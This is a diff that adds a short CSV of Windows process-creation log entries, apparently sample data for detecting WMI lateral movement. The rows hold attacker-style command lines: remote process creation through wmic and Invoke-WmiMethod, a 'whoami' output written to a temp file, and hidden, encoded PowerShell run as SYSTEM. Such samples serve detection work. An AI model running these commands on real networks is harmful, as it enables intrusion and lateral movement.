@@ -1,0 +1,4 @@
+TimeCreated,Computer,User,Image,ParentImage,CommandLine
+2025-08-16T02:41:10+05:30,WS-100,acme\jane.doe,C:\Windows\System32\wbem\wmic.exe,C:\Windows\System32\cmd.exe,"wmic /node:10.10.5.21 process call create ""powershell -nop -w hidden -enc SQBFAFgA..."""
+2025-08-16T02:42:35+05:30,WS-100,acme\jane.doe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell -Command ""Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd /c whoami > C:\\Windows\\Temp\\a.txt' -ComputerName WS-305"""
+2025-08-16T02:43:12+05:30,WS-305,NT AUTHORITY\SYSTEM,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,powershell.exe -nop -w hidden -enc SQBFAFgA...
